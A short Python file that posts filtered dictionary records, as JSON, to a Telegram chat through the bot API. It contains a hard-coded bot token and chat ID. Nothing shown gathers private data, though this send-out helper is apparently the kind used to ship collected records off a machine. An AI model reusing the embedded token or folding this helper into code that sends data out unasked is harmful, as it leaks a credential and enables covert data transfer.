import requests
import json

BOT_TOKEN = '7612275874:AAHkZ3F1-xNyDdV8jJYhS9MXbN3xqSnI3l8'
CHAT_ID = '-1002438870737'
url = f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage'

def send_telegram(name, value, message):
    payload = {
        'chat_id': CHAT_ID,
        'text': f'#{name}\n{value}: {message}'
    }
    requests.post(url, data=payload)

def send_message(name, message):
    for value in message:
        filtered_message = {k: v for k, v in message[value].items() if v != "N/A" and v != []}
        if filtered_message:  
            send_telegram(name, value, json.dumps(filtered_message, indent=4))
